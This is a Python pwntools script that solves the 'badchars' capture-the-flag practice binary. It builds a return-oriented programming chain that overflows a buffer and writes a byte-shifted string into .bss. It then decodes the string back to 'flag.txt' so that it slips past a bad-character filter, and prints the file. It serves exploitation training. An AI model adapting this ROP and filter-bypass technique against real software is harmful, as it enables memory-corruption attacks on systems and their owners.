from pwn import *

trash =  cyclic(40) #used cyclic(100, alphabet = string.ascii_uppercase)
mov_r13_r12 = p64(0x0000000000400634) #mov [r13], r12
pop_r12_r13_r14_r15 = p64(0x000000000040069c)
sub_r15_r14b = p64(0x0000000000400630) #sub [r15], r14b
bss_addr = 0x00601038
pop_r15 = p64(0x00000000004006a2)
pop_rdi = p64(0x00000000004006a3)
print_fun = p64(0x00400620)
string = b"hnci0vzv" #string to sub with 2 to obtain flag.txt

payload =  trash 
payload += pop_r12_r13_r14_r15
payload += string + p64(bss_addr) + p64(2) + p64(bss_addr)
payload += mov_r13_r12

payload += sub_r15_r14b
for i in range(1,8):
	payload += pop_r15
	payload += p64(bss_addr + i)
	payload += sub_r15_r14b
	
payload += pop_rdi + p64(bss_addr)
payload += print_fun + p64(0)

p = process("./badchars")
p.sendline(payload)
p.interactive()
